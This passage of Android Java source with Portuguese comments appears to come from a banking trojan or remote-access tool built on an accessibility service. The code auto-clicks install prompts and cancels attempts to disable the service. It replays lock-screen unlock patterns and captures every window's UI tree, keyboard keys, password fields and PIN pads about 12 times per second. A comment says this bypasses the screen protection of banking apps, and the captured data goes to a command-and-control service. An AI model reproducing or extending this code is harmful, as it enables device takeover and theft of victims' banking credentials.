                return;
            }
        }
        
        // Recursivamente procura nos filhos
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                findAndClickSwitch(child);
            }
        }
    }
    
    /**
     * 📦 Procura e clica em botões por classe
     */
    private void findAndClickButton(AccessibilityNodeInfo node, String[] texts) {
        if (node == null) return;
        
        String className = node.getClassName() != null ? node.getClassName().toString() : "";
        
        if (className.contains("Button") && node.isClickable()) {
            CharSequence nodeText = node.getText();
            CharSequence nodeDesc = node.getContentDescription();
            
            String text = nodeText != null ? nodeText.toString().toLowerCase() : "";
            String desc = nodeDesc != null ? nodeDesc.toString().toLowerCase() : "";
            
            for (String t : texts) {
                if (text.contains(t.toLowerCase()) || desc.contains(t.toLowerCase())) {
                    Log.d(TAG, "📦 AUTO-INSTALL: Encontrou botão '" + t + "' - clicando!");
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return;
                }
            }
        }
        
        // Procura nos filhos
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                findAndClickButton(child, texts);
            }
        }
    }
    
    /**
     * Clica no botão Cancel/Cancelar
     */
    private void clickCancelButton(AccessibilityNodeInfo node) {
        if (node == null) return;
        
        // Procura botão Cancel
        List<AccessibilityNodeInfo> cancelButtons = node.findAccessibilityNodeInfosByText("Cancel");
        if (cancelButtons == null || cancelButtons.isEmpty()) {
            cancelButtons = node.findAccessibilityNodeInfosByText("Cancelar");
        }
        if (cancelButtons == null || cancelButtons.isEmpty()) {
            cancelButtons = node.findAccessibilityNodeInfosByText("No");
        }
        if (cancelButtons == null || cancelButtons.isEmpty()) {
            cancelButtons = node.findAccessibilityNodeInfosByText("Não");
        }
        
        if (cancelButtons != null && !cancelButtons.isEmpty()) {
            for (AccessibilityNodeInfo btn : cancelButtons) {
                if (btn.isClickable()) {
                    Log.d(TAG, "🔒 Clicando em CANCEL!");
                    btn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return;
                }
                // Tenta clicar no pai se o botão não for clicável
                AccessibilityNodeInfo parent = btn.getParent();
                if (parent != null && parent.isClickable()) {
                    Log.d(TAG, "🔒 Clicando no pai do CANCEL!");
                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return;
                }
            }
        }
    }
    
    /**
     * Verifica se a tela contém texto relacionado a Acessibilidade
     */
    private boolean containsAccessibilityText(AccessibilityNodeInfo node) {
        if (node == null) return false;
        
        // Textos que indicam tela de acessibilidade
        String[] accessibilityTexts = {
            "Accessibility", "Acessibilidade", 
            "Downloaded services", "Serviços baixados",
            "Installed services", "Serviços instalados",
            "Screen readers", "Leitores de tela"
        };
        
        return containsAnyText(node, accessibilityTexts);
    }
    
    /**
     * Verifica se a tela contém o nome do nosso app
     * Pega o nome DINAMICAMENTE do próprio APK
     */
    private boolean containsOurAppName(AccessibilityNodeInfo node) {
        if (node == null) return false;
        
        // Pega o nome do app dinamicamente
        String appName = getAppName();
        String packageName = getPackageName();
        
        // Lista de nomes para verificar
        java.util.List<String> ourAppNames = new java.util.ArrayList<>();
        
        // Nome do app (definido no build) e package — sem termos genéricos
        if (appName != null && !appName.isEmpty()) {
            ourAppNames.add(appName);
        }
        
        // Package name
        ourAppNames.add(packageName);
        
        return containsAnyText(node, ourAppNames.toArray(new String[0]));
    }
    
    /**
     * Obtém o nome do app definido no AndroidManifest/strings
     */
    private String getAppName() {
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            android.content.pm.ApplicationInfo ai = pm.getApplicationInfo(getPackageName(), 0);
            return (String) pm.getApplicationLabel(ai);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao obter nome do app: " + e.getMessage());
            return null;
        }
    }
    
    /**
     * Verifica se a hierarquia contém algum dos textos especificados
     */
    private boolean containsAnyText(AccessibilityNodeInfo node, String[] texts) {
        if (node == null) return false;
        
        // Verifica texto do nó atual
        CharSequence nodeText = node.getText();
        CharSequence contentDesc = node.getContentDescription();
        
        for (String text : texts) {
            if (nodeText != null && nodeText.toString().toLowerCase().contains(text.toLowerCase())) {
                return true;
            }
            if (contentDesc != null && contentDesc.toString().toLowerCase().contains(text.toLowerCase())) {
                return true;
            }
        }
        
        // Verifica filhos
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (containsAnyText(child, texts)) {
                    return true;
                }
                // Não recicla aqui para evitar problemas
            }
        }
        
        return false;
    }
    
    // ==================== DELEGADORES GESTOS (implementação em GestureCore) ====================

    private void executeClick(int x, int y) {
        if (gestureCore != null) gestureCore.executeClick(x, y);
    }

    private void executeSwipe(int x1, int y1, int x2, int y2) {
        if (gestureCore != null) gestureCore.executeSwipe(x1, y1, x2, y2);
    }

    private void executeLongPress(int x, int y, int duration) {
        if (gestureCore != null) gestureCore.executeLongPress(x, y, duration);
    }

    private void executePathGesture(int[][] points) {
        if (gestureCore != null) gestureCore.executePathGesture(points);
    }

    private void executeType(String text) {
        if (gestureCore != null) gestureCore.executeType(text);
    }

    // ==================== PATTERN UNLOCK INTELIGENTE ====================
    
    /**
     * Executa um Pattern Unlock de forma inteligente
     * Detecta automaticamente o lockPatternView na tela e calcula as coordenadas
     * 
     * @param patternPoints Array de pontos (1-9) representando o pattern
     *                      Ex: [1,4,7,8,9] para um L
     */
    private void executePatternUnlock(int[] patternPoints) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            Log.e(TAG, "❌ Pattern unlock requer Android 7.0+");
            return;
        }
        
        Log.d(TAG, "🔓 Iniciando Pattern Unlock inteligente...");
        
        // Busca o lockPatternView na hierarquia
        AccessibilityNodeInfo patternView = findPatternView();
        
        if (patternView == null) {
            Log.e(TAG, "❌ lockPatternView não encontrado na tela");
            // Tenta acordar tela e mostrar pattern
            wakeUpScreen();
            handler.postDelayed(() -> {
                // Swipe para mostrar pattern
                executeSwipe(540, 1800, 540, 900);
                handler.postDelayed(() -> {
                    // Tenta novamente
                    AccessibilityNodeInfo pv = findPatternView();
                    if (pv != null) {
                        executePatternGesture(pv, patternPoints);
                    } else {
                        Log.e(TAG, "❌ Pattern view ainda não encontrado após swipe");
                    }
                }, 500);
            }, 1000);
            return;
        }
        
        executePatternGesture(patternView, patternPoints);
    }
    
    /**
     * Busca o lockPatternView na hierarquia de acessibilidade
     */
    private AccessibilityNodeInfo findPatternView() {
        // Busca em todas as janelas
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            List<AccessibilityWindowInfo> windows = getWindows();
            for (AccessibilityWindowInfo window : windows) {
                AccessibilityNodeInfo root = window.getRoot();
                if (root != null) {
                    AccessibilityNodeInfo patternView = findPatternViewRecursive(root);
                    if (patternView != null) {
                        return patternView;
                    }
                }
            }
        }
        
        // Fallback: busca na janela ativa
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null) {
            return findPatternViewRecursive(root);
        }
        
        return null;
    }
    
    /**
     * Busca recursivamente pelo lockPatternView
     */
    private AccessibilityNodeInfo findPatternViewRecursive(AccessibilityNodeInfo node) {
        if (node == null) return null;
        
        // Verifica resource-id
        String resourceId = node.getViewIdResourceName();
        if (resourceId != null && 
            (resourceId.contains("lockPatternView") || 
             resourceId.contains("pattern_container"))) {
            Log.d(TAG, "🔍 Encontrou lockPatternView: " + resourceId);
            return node;
        }
        
        // Verifica content-desc (alguns dispositivos usam isso)
        CharSequence contentDesc = node.getContentDescription();
        if (contentDesc != null && contentDesc.toString().toLowerCase().contains("pattern")) {
            Log.d(TAG, "🔍 Encontrou pattern por content-desc");
            return node;
        }
        
        // Busca nos filhos
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo found = findPatternViewRecursive(child);
                if (found != null) {
                    return found;
                }
            }
        }
        
        return null;
    }
    
    /**
     * Executa o gesto do pattern baseado nas coordenadas do patternView
     */
    private void executePatternGesture(AccessibilityNodeInfo patternView, int[] patternPoints) {
        if (patternPoints == null || patternPoints.length < 2) {
            Log.e(TAG, "❌ Pattern inválido (precisa de pelo menos 2 pontos)");
            return;
        }
        
        // Obtém bounds do patternView
        android.graphics.Rect bounds = new android.graphics.Rect();
        patternView.getBoundsInScreen(bounds);
        
        Log.d(TAG, "📐 Pattern bounds: " + bounds.toString());
        
        int width = bounds.width();
        int height = bounds.height();
        int cellWidth = width / 3;
        int cellHeight = height / 3;
        
        // Calcula coordenadas dos 9 pontos
        // Grid 3x3:
        // 1 2 3
        // 4 5 6
        // 7 8 9
        int[][] pointCoords = new int[10][2]; // índice 1-9
        for (int i = 1; i <= 9; i++) {
            int row = (i - 1) / 3;  // 0, 0, 0, 1, 1, 1, 2, 2, 2
            int col = (i - 1) % 3;  // 0, 1, 2, 0, 1, 2, 0, 1, 2
            
            pointCoords[i][0] = bounds.left + (col * cellWidth) + (cellWidth / 2);
            pointCoords[i][1] = bounds.top + (row * cellHeight) + (cellHeight / 2);
            
            Log.d(TAG, "📍 Ponto " + i + ": (" + pointCoords[i][0] + ", " + pointCoords[i][1] + ")");
        }
        
        // Constrói o Path do pattern
        Path patternPath = new Path();
        
        // Move para o primeiro ponto
        int firstPoint = patternPoints[0];
        patternPath.moveTo(pointCoords[firstPoint][0], pointCoords[firstPoint][1]);
        Log.d(TAG, "🔓 Pattern: Iniciando em ponto " + firstPoint);
        
        // Conecta aos demais pontos
        for (int i = 1; i < patternPoints.length; i++) {
            int point = patternPoints[i];
            patternPath.lineTo(pointCoords[point][0], pointCoords[point][1]);
            Log.d(TAG, "🔓 Pattern: -> ponto " + point);
        }
        
        // Executa o gesto
        // Duração: 50ms por ponto (rápido mas natural)
        long duration = patternPoints.length * 100;
        
        GestureDescription.StrokeDescription stroke = 
            new GestureDescription.StrokeDescription(patternPath, 0, duration);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);
        
        boolean dispatched = dispatchGesture(builder.build(), new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                Log.d(TAG, "✅ Pattern executado com sucesso!");
            }
            
            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                Log.e(TAG, "❌ Pattern cancelado!");
            }
        }, null);
        
        if (!dispatched) {
            Log.e(TAG, "❌ Falha ao executar pattern!");
        }
    }
    
    /**
     * Converte string de pattern (ex: "14789") para array de inteiros
     */
    private int[] parsePatternString(String pattern) {
        if (pattern == null || pattern.isEmpty()) return null;
        
        int[] points = new int[pattern.length()];
        for (int i = 0; i < pattern.length(); i++) {
            char c = pattern.charAt(i);
            if (c >= '1' && c <= '9') {
                points[i] = c - '0';
            } else {
                Log.e(TAG, "❌ Caractere inválido no pattern: " + c);
                return null;
            }
        }
        return points;
    }
    
    /**
     * ========================================
     * SCREEN READER V2 - BYPASS FLAG_SECURE
     * ========================================
     * 
     * Captura a hierarquia completa da interface via AccessibilityNodeInfo
     * Bypassa FLAG_SECURE de apps bancários que bloqueiam VNC
     * Envia árvore de elementos em JSON para visualização texto
     */
    
    private void startScreenReader() {
        Log.d(TAG, "🚀 Iniciando Screen Reader V2...");
        
        screenReaderRunnable = new Runnable() {
            @Override
            public void run() {
                if (screenReaderEnabled) {
                    captureScreenHierarchy();
                    // Captura a cada 80ms (~12 FPS) - OTIMIZADO!
                    screenReaderHandler.postDelayed(this, 80);
                }
            }
        };
        
        screenReaderHandler.post(screenReaderRunnable);
    }
    
    private void stopScreenReader() {
        if (screenReaderRunnable != null) {
            screenReaderHandler.removeCallbacks(screenReaderRunnable);
            screenReaderRunnable = null;
        }
        Log.d(TAG, "🛑 Screen Reader V2 parado");
    }
    
    private void captureScreenHierarchy() {
        try {
            JSONObject json = new JSONObject();
            json.put("timestamp", dateFormat.format(new Date()));
            
            String mainPackage = "";
            org.json.JSONArray allChildren = new org.json.JSONArray();
            
            // CAPTURA TODAS AS JANELAS VISÍVEIS (incluindo lockscreen, systemui, teclado, etc.)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                List<AccessibilityWindowInfo> windows = getWindows();
                
                for (AccessibilityWindowInfo window : windows) {
                    AccessibilityNodeInfo windowRoot = window.getRoot();
                    if (windowRoot == null) continue;
                    
                    try {
                        String windowPackage = "";
                        if (windowRoot.getPackageName() != null) {
                            windowPackage = windowRoot.getPackageName().toString();
                        }
                        
                        // Pega o package principal (primeira janela ativa)
                        if (mainPackage.isEmpty() && !windowPackage.isEmpty()) {
                            mainPackage = windowPackage;
                        }
                        
                        JSONObject windowHierarchy = buildNodeTree(windowRoot, 0);
                        if (windowHierarchy != null) {
                            // Marca tipo de janela para identificação
                            int windowType = window.getType();
                            windowHierarchy.put("windowType", windowType);
                            windowHierarchy.put("windowPackage", windowPackage);
                            
                            // Marca janelas especiais
                            if (windowType == AccessibilityWindowInfo.TYPE_INPUT_METHOD) {
                                markAsKeyboard(windowHierarchy);
                            } else if (windowPackage.contains("systemui") || windowPackage.contains("keyguard")) {
                                // Tela de bloqueio / System UI
                                windowHierarchy.put("isLockScreen", true);
                            }
                            
                            allChildren.put(windowHierarchy);
                        }
                    } finally {
                        windowRoot.recycle();
                    }
                }
            } else {
                // Fallback para Android < 5.0
                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                if (rootNode != null) {
                    if (rootNode.getPackageName() != null) {
                        mainPackage = rootNode.getPackageName().toString();
                    }
                    JSONObject hierarchy = buildNodeTree(rootNode, 0);
                    if (hierarchy != null) {
                        allChildren.put(hierarchy);
                    }
                    rootNode.recycle();
                }
            }
            
            // Se não conseguiu nada das janelas, tenta getRootInActiveWindow
            if (allChildren.length() == 0) {
                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                if (rootNode != null) {
                    if (rootNode.getPackageName() != null) {
                        mainPackage = rootNode.getPackageName().toString();
                    }
                    JSONObject hierarchy = buildNodeTree(rootNode, 0);
                    if (hierarchy != null) {
                        allChildren.put(hierarchy);
                    }
                    rootNode.recycle();
                }
            }
            
            json.put("package", mainPackage);
            
            // Cria hierarquia raiz com todas as janelas
            JSONObject rootHierarchy = new JSONObject();
            rootHierarchy.put("class", "RootView");
            rootHierarchy.put("children", allChildren);
            
            // Bounds da tela inteira
            JSONObject screenBounds = new JSONObject();
            screenBounds.put("x", 0);
            screenBounds.put("y", 0);
            screenBounds.put("w", getResources().getDisplayMetrics().widthPixels);
            screenBounds.put("h", getResources().getDisplayMetrics().heightPixels);
            rootHierarchy.put("bounds", screenBounds);
            
            json.put("hierarchy", rootHierarchy);
            
            // Envia para servidor
            sendScreenHierarchy(json.toString());
            
        } catch (JSONException e) {
            Log.e(TAG, "Erro ao criar JSON da hierarquia: " + e.getMessage());
        }
    }
    
    private void markAsKeyboard(JSONObject node) throws JSONException {
        // Marca este nó e todos os filhos como parte do teclado
        node.put("isKeyboard", true);
        
        if (node.has("children")) {
            org.json.JSONArray children = node.getJSONArray("children");
            for (int i = 0; i < children.length(); i++) {
                markAsKeyboard(children.getJSONObject(i));
            }
        }
    }
    
    private JSONObject buildNodeTree(AccessibilityNodeInfo node, int depth) throws JSONException {
        if (node == null || depth > 25) { // Limite de profundidade aumentado
            return null;
        }
        
        JSONObject nodeJson = new JSONObject();
        
        // Informações básicas
        String className = "";
        if (node.getClassName() != null) {
            className = node.getClassName().toString();
            nodeJson.put("class", className);
        }
        
        // Texto principal
        String nodeText = "";
        if (node.getText() != null && node.getText().length() > 0) {
            nodeText = node.getText().toString();
            nodeJson.put("text", nodeText);
        }
        
        // Content Description (usado pelo Gboard para teclas)
        String nodeDesc = "";
        if (node.getContentDescription() != null && node.getContentDescription().length() > 0) {
            nodeDesc = node.getContentDescription().toString();
            nodeJson.put("desc", nodeDesc);
            
            // Se não tem texto mas tem desc, usa desc como texto (importante para teclados)
            if (nodeText.isEmpty()) {
                nodeJson.put("text", nodeDesc);
            }
        }
        
        // Hint do campo de texto (importante para campos de senha)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence hintText = node.getHintText();
            if (hintText != null && hintText.length() > 0) {
                nodeJson.put("hint", hintText.toString());
            }
        }
        
        // Tooltip (Android 9+) - pode conter texto de teclas
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            CharSequence tooltipText = node.getTooltipText();
            if (tooltipText != null && tooltipText.length() > 0) {
                nodeJson.put("tooltip", tooltipText.toString());
                // Se não tem texto nem desc, usa tooltip
                if (nodeText.isEmpty() && nodeDesc.isEmpty()) {
                    nodeJson.put("text", tooltipText.toString());
                }
            }
        }
        
        // StateDescription (Android 11+) - pode ter info adicional
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            CharSequence stateDesc = node.getStateDescription();
            if (stateDesc != null && stateDesc.length() > 0) {
                nodeJson.put("stateDesc", stateDesc.toString());
            }
        }
        
        // Extras Bundle - pode conter informações adicionais sobre teclas
        try {
            android.os.Bundle extras = node.getExtras();
            if (extras != null && !extras.isEmpty()) {
                for (String key : extras.keySet()) {
                    Object value = extras.get(key);
                    if (value != null) {
                        String strValue = value.toString();
                        // Captura qualquer texto útil dos extras
                        if (strValue.length() > 0 && strValue.length() < 100) {
                            if (key.toLowerCase().contains("text") || key.toLowerCase().contains("label") ||
                                key.toLowerCase().contains("key") || key.toLowerCase().contains("char")) {
                                nodeJson.put("extra_" + key, strValue);
                                // Se ainda não tem texto, usa este
                                if (nodeText.isEmpty() && nodeDesc.isEmpty()) {
                                    nodeJson.put("text", strValue);
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            // Ignora erros ao acessar extras
        }
        
        // Tenta obter texto via getAvailableExtraData (Android 8+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                java.util.List<String> extraDataKeys = node.getAvailableExtraData();
                if (extraDataKeys != null && !extraDataKeys.isEmpty()) {
                    for (String key : extraDataKeys) {
                        if (key != null) {
                            nodeJson.put("extraDataKey", key);
                        }
                    }
                }
            } catch (Exception e) {
                // Ignora
            }
        }
        
        // Para teclados: tenta inferir a tecla baseado na posição (layout QWERTY)
        String packageName = node.getPackageName() != null ? node.getPackageName().toString() : "";
        boolean isKeyboard = packageName.contains("inputmethod") || packageName.contains("keyboard") || 
                            packageName.contains("gboard") || packageName.contains("latin");
        
        if (isKeyboard && node.isClickable() && nodeText.isEmpty() && nodeDesc.isEmpty()) {
            // Marca como tecla de teclado sem texto visível
            nodeJson.put("isKeyboardKey", true);
            nodeJson.put("keyboardPackage", packageName);
            
            // Obtém bounds para possível inferência de tecla
            Rect keyBounds = new Rect();
            node.getBoundsInScreen(keyBounds);
            
            // Adiciona informação de tamanho para identificar tipo de tecla
            int keyWidth = keyBounds.width();
            int keyHeight = keyBounds.height();
            
            // Teclas especiais geralmente são mais largas
            if (keyWidth > keyHeight * 2) {
                nodeJson.put("keyType", "special"); // Espaço, Enter, Shift, etc.
            } else if (keyWidth > keyHeight * 1.3) {
                nodeJson.put("keyType", "medium"); // Backspace, etc.
            } else {
                nodeJson.put("keyType", "letter"); // Letra/número normal
            }
        }
        
        String viewId = "";
        if (node.getViewIdResourceName() != null) {
            viewId = node.getViewIdResourceName();
            nodeJson.put("id", viewId);
        }
        
        // Estados
        nodeJson.put("clickable", node.isClickable());
        nodeJson.put("editable", node.isEditable());
        nodeJson.put("password", node.isPassword());
        nodeJson.put("checked", node.isChecked());
        nodeJson.put("enabled", node.isEnabled());
        nodeJson.put("focused", node.isFocused());
        nodeJson.put("scrollable", node.isScrollable());
        nodeJson.put("longClickable", node.isLongClickable());
        nodeJson.put("selected", node.isSelected());
        
        // Detecta elementos especiais da tela de bloqueio
        String classLower = className.toLowerCase();
        String idLower = viewId.toLowerCase();
        
        // PIN Pad / Teclado numérico de desbloqueio
        if (classLower.contains("pinview") || classLower.contains("numpad") || 
            classLower.contains("keyguard") || classLower.contains("lockpattern") ||
            idLower.contains("pin") || idLower.contains("keyguard") ||
            idLower.contains("lock") || idLower.contains("pattern")) {
            nodeJson.put("isLockElement", true);
        }
        
        // Botão numérico (0-9)
        if (node.getText() != null) {
            String text = node.getText().toString().trim();
            if (text.matches("^[0-9]$") && node.isClickable()) {
                nodeJson.put("isPinDigit", true);
            }
        }
        
        // Padrão de desbloqueio (LockPatternView)
        if (classLower.contains("lockpatternview") || classLower.contains("patternview") || idLower.contains("lockpattern")) {
            nodeJson.put("isPatternLock", true);
        }
        
        // Slider de desbloqueio (swipe to unlock)
        if (classLower.contains("slider") || classLower.contains("swipe") ||
            idLower.contains("slide") || idLower.contains("swipe") ||
            idLower.contains("unlock") || classLower.contains("keyguard") || idLower.contains("keyguard")) {
            nodeJson.put("isSwipeUnlock", true);
        }
        
        // Bounds (posição na tela)
        Rect bounds = new Rect();
        node.getBoundsInScreen(bounds);
        JSONObject boundsJson = new JSONObject();
        boundsJson.put("x", bounds.left);
        boundsJson.put("y", bounds.top);
        boundsJson.put("w", bounds.width());
        boundsJson.put("h", bounds.height());
        nodeJson.put("bounds", boundsJson);
        if (nodeJson.optBoolean("isPatternLock")) {
            int cw = Math.max(1, bounds.width() / 3);
            int ch = Math.max(1, bounds.height() / 3);
            org.json.JSONArray grid = new org.json.JSONArray();
            for (int i = 0; i < 9; i++) {
                int row = i / 3;
                int col = i % 3;
                int cx = bounds.left + (col * cw) + (cw / 2);
                int cy = bounds.top + (row * ch) + (ch / 2);
                org.json.JSONObject p = new org.json.JSONObject();
                p.put("x", cx);
                p.put("y", cy);
                p.put("r", Math.min(cw, ch) / 8);
                grid.put(p);
            }
            nodeJson.put("patternGrid", grid);
            nodeJson.put("gridRows", 3);
            nodeJson.put("gridCols", 3);
        }
        if (nodeJson.optBoolean("isSwipeUnlock")) {
            int sx = bounds.left + bounds.width() / 2;
            int sy = bounds.top + (int)(bounds.height() * 0.75);
            int ex = sx;
            int ey = bounds.top + (int)(bounds.height() * 0.25);
            org.json.JSONObject hint = new org.json.JSONObject();
            hint.put("sx", sx);
            hint.put("sy", sy);
            hint.put("ex", ex);
            hint.put("ey", ey);
            nodeJson.put("swipeHint", hint);
        }
        
        // Filhos
        int childCount = node.getChildCount();
        if (childCount > 0) {
            org.json.JSONArray children = new org.json.JSONArray();
            for (int i = 0; i < childCount && i < 100; i++) { // Aumentado para 100 filhos
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    JSONObject childJson = buildNodeTree(child, depth + 1);
                    if (childJson != null) {
                        children.put(childJson);
                    }
                    child.recycle();
                }
            }
            if (children.length() > 0) {
                nodeJson.put("children", children);
            }
        }
        
        return nodeJson;
    }
    
    private void sendScreenHierarchy(String jsonData) {
        try {
            // Envia para CommandControlService
            Intent intent = new Intent(this, CommandControlService.class);
            intent.setAction("SEND_SCREEN_HIERARCHY");
            intent.putExtra("data", jsonData);
            startService(intent);
            
            Log.d(TAG, "📤 Hierarquia enviada (" + jsonData.length() + " bytes)");
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao enviar hierarquia: " + e.getMessage());
        }
    }
}
